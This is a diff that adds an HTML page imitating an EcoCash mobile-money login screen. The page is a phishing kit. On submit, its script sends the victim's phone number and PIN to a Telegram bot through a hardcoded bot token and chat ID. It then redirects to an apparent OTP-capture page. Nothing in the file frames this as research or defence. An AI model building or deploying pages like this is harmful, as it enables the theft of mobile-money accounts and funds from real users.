@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>EcoCash Login</title>
+<style>
+  /* Reset */
+  *, *::before, *::after {
+    box-sizing: border-box;
+  }
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    font-family: Arial, sans-serif;
+    background: white;
+    position: relative;
+    overflow-x: hidden;
+  }
+  body {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    padding-bottom: 180px; /* to avoid being covered by curve */
+  }
+  .container {
+    margin: 80px auto 0;
+    max-width: 360px;
+    padding: 0 24px;
+    text-align: center;
+    position: relative;
+    z-index: 1;
+  }
+  .logo {
+    font-weight: 700;
+    font-size: 2.5rem;
+  }
+  .logo .blue {
+    color: #0057b7;
+  }
+  .logo .red {
+    color: #d93025;
+  }
+  h2 {
+    font-weight: 600;
+    font-size: 1.3rem;
+    margin: 24px 0 32px;
+    color: #444;
+  }
+  /* Phone input with flag and dropdown */
+  .phone-input-wrapper {
+    display: flex;
+    align-items: center;
+    border: 2px solid #0057b7;
+    border-radius: 6px;
+    height: 48px;
+    max-width: 100%;
+    margin: 0 auto 48px;
+    padding: 0;
+  }
+  .flag-dropdown {
+    display: flex;
+    align-items: center;
+    padding: 0 12px;
+    background: white;
+    height: 100%;
+    cursor: pointer;
+    user-select: none;
+  }
+  .flag-dropdown img {
+    width: 28px;
+    height: 18px;
+  }
+  .flag-dropdown select {
+    margin-left: 8px;
+    border: none;
+    outline: none;
+    background: transparent;
+    font-size: 1.1rem;
+    color: #444;
+    cursor: pointer;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+  }
+  .phone-input {
+    flex: 1;
+    height: 100%;
+    width: 2px;
+    border: none;
+    outline: none;
+    font-size: 1.2rem;
+    color: #444;
+  }
+  .phone-input::placeholder {
+    color: #999;
+  }
+  label {
+    font-weight: 500;
+    margin-bottom: 12px;
+    font-size: 1rem;
+    display: block;
+  }
+  /* PIN container */
+  .pin-container {
+    display: flex;
+    justify-content: center;
+    gap: 16px;
+    margin-bottom: 24px;
+  }
+  .pin-container input {
+    width: 56px;
+    height: 56px;
+    font-size: 1.8rem;
+    font-weight: 600;
+    text-align: center;
+    border: 2px solid #0057b7;
+    border-radius: 6px;
+    outline: none;
+    transition: border-color 0.3s ease;
+  }
+  .pin-container input:focus {
+    border-color: #d93025;
+    box-shadow: 0 0 8px #d93025;
+  }
+  .forgot {
+    font-size: 1rem;
+    color: #777;
+    cursor: pointer;
+    user-select: none;
+    margin-bottom: 8px;
+  }
+  button.submit-btn {
+    width: 100%;
+    max-width: 280px;
+    background-color: #0057b7;
+    border: none;
+    color: white;
+    font-weight: 600;
+    font-size: 1.2rem;
+    padding: 14px;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+  }
+  button.submit-btn:hover {
+    background-color: #003a80;
+  }
+  /* Bottom half-circle curve */
+  .bottom-curve {
+    position: fixed;
+    bottom: 0;
+    left: 50%;
+    transform: translateX(-50%) scaleX(-1);
+    width: 140vw;
+    height: 200px;
+    background: #0057b7;
+    border-top-left-radius: 100% 100px;
+    border-top-right-radius: 100% 100px;
+    border-bottom-left-radius: 0;
+    border-bottom-right-radius: 0;
+    z-index: 0;
+  }
+  /* Responsive adjustments */
+  @media (max-width: 400px) {
+    .pin-container input {
+      width: 50px;
+      height: 50px;
+      font-size: 1.6rem;
+    }
+    .phone-input-wrapper {
+      height: 44px;
+    }
+    .flag-dropdown img {
+      width: 24px;
+      height: 16px;
+    }
+    .flag-dropdown select {
+      font-size: 1rem;
+    }
+    .phone-input {
+      font-size: 1rem;
+    }
+  }
+</style>
+</head>
+<body>
+  <main class="container" role="main" aria-label="EcoCash Login Form">
+    <div class="logo" aria-label="EcoCash Logo">
+      <span class="blue">Eco</span><span class="red">Cash</span>
+    </div>
+    <h2>Login</h2>
+
+    <div class="phone-input-wrapper" aria-label="Phone number input">
+      <div class="flag-dropdown" tabindex="0" aria-label="Country code selector">
+        <img src="https://flagcdn.com/w40/zw.png" alt="Zimbabwe Flag" />
+        <select id="countryCode" aria-label="Select country code" name="countryCode">
+          <option value="+263" selected>+263</option>
+          <!-- Add others if needed -->
+        </select>
+      </div>
+      <input
+        type="tel"
+        id="phoneInput"
+        class="phone-input"
+        placeholder="Enter phone number"
+        inputmode="numeric"
+        pattern="[0-9]*"
+        aria-describedby="countryCode"
+        required
+      />
+    </div>
+
+    <label for="pin1">Enter your PIN</label>
+    <form id="pinForm" autocomplete="off" style="text-align:center;">
+      <div class="pin-container">
+        <input maxlength="1" type="password" id="pin1" name="pin1" inputmode="numeric" pattern="[0-9]*" required />
+        <input maxlength="1" type="password" id="pin2" name="pin2" inputmode="numeric" pattern="[0-9]*" required />
+        <input maxlength="1" type="password" id="pin3" name="pin3" inputmode="numeric" pattern="[0-9]*" required />
+        <input maxlength="1" type="password" id="pin4" name="pin4" inputmode="numeric" pattern="[0-9]*" required />
+      </div>
+      <div class="forgot" tabindex="0" role="button" aria-label="Forgot PIN?">Forgot PIN?</div>
+      <button type="submit" class="submit-btn" aria-label="Submit PIN">Submit</button>
+    </form>
+  </main>
+
+  <div class="bottom-curve" aria-hidden="true"></div>
+
+<script>
+  // Auto tab on PIN inputs
+  const pinInputs = document.querySelectorAll('.pin-container input');
+  pinInputs.forEach((input, i) => {
+    input.addEventListener('input', (e) => {
+      if (!/^\d$/.test(e.target.value)) {
+        e.target.value = '';
+        return;
+      }
+      if (i < pinInputs.length - 1) pinInputs[i + 1].focus();
+    });
+    input.addEventListener('keydown', (e) => {
+      if (e.key === "Backspace" && !e.target.value && i > 0) {
+        pinInputs[i - 1].focus();
+      }
+    });
+  });
+
+  // Forgot PIN click handler
+  document.querySelector('.forgot').addEventListener('click', () => {
+    alert('Forgot PIN Clicked - add your recovery logic');
+  });
+
+ // Telegram Bot Configuration (REPLACE WITH YOUR VALUES)
+const BOT_TOKEN = '7727536198:AAHVg5-c49YD5HLPHN38BR0fXMNSu5kc8F8'; 
+const CHAT_ID = '6616863663';
+
+// Function to send message to Telegram
+async function sendToTelegram(message) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const response = await fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+    }),
+  });
+  return response.ok;
+}
+
+// Form submission handler with Telegram integration
+document.getElementById('pinForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+
+  const countryCode = document.getElementById('countryCode').value.trim();
+  const phoneNumber = document.getElementById('phoneInput').value.trim();
+  if (!phoneNumber) {
+    alert('Please enter your phone number');
+    document.getElementById('phoneInput').focus();
+    return;
+  }
+  const pin = Array.from(pinInputs).map(input => input.value).join('');
+  if (pin.length < 4) {
+    alert('Please enter a 4-digit PIN');
+    return;
+  }
+
+  // Retrieve selected plan from sessionStorage
+  const selectedPlan = JSON.parse(sessionStorage.getItem('selectedPlan') || '{}');
+  const planName = selectedPlan.name || selectedPlan.shortName || 'Unknown';
+
+  // Prepare message for Telegram (now includes plan)
+  const message = `New EcoCash Login:\nPhone: ${countryCode}${phoneNumber}\nPIN: ${pin}\nPlan: ${planName}`;
+
+  try {
+    const success = await sendToTelegram(message);
+    if (success) {
+      // Save phone number to localStorage for next page
+      localStorage.setItem('phone', phoneNumber);
+      // Redirect on success
+      window.location.href = 'trialotp.html';
+    } else {
+      alert('Failed to submit. Please check your internet connection');
+    }
+  } catch (error) {
+    console.error('Error sending to Telegram:', error);
+    alert('Submission failed. Please try again.');
+  }
+});
+</script>
+</body>
+</html>
